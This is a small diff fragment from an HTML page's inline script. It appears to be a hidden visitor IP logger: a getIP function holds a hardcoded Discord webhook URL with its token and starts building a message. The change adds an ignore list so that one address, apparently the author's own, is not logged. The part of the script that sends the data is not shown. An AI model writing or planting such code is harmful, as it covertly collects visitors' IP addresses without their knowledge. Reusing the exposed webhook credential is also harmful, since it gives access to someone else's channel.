@@ -66,6 +66,11 @@
     <script>
         function getIP(json) {
             const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';
+              ignoredIps = ['122.173.31.1']
+            
+              if (ignoredIps.includes(json.ip)) {
+                  return
+              };
 
             const data = {
                 "content": null,
